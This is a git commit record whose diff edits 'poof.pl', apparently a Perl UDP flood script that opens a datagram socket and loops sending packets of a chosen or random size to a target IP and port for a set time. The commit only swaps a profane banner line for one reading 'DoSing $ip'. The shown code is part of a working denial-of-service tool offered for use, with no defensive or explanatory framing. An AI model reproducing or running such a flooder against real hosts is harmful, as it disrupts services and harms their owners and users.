89a7086ad43660929e8aff506167415643156cea
Sup3rSkidd3r <42467674+Sup3rSkidd3r@users.noreply.github.com>
2019-02-12 00:05:27 -0300

    Update poof.pl

--- poof.pl
+++ poof.pl
@@ -9,8 +9,7 @@ $iaddr = inet_aton("$ip") or die "Usage: perl poof.pl <Target> <Port> <Packet Si
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-print "FUCKING WEE POOF UP. FUCKING $ip on port $port with $size byte packets for $time seconds\n";
-print "MADE BY K1LLZz. < HIYA POOF ITS NO THAT STRONG CAUSE ITS PERL\n";
+print "DoSing $ip on port $port with $size byte packets for $time seconds\n";
 
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
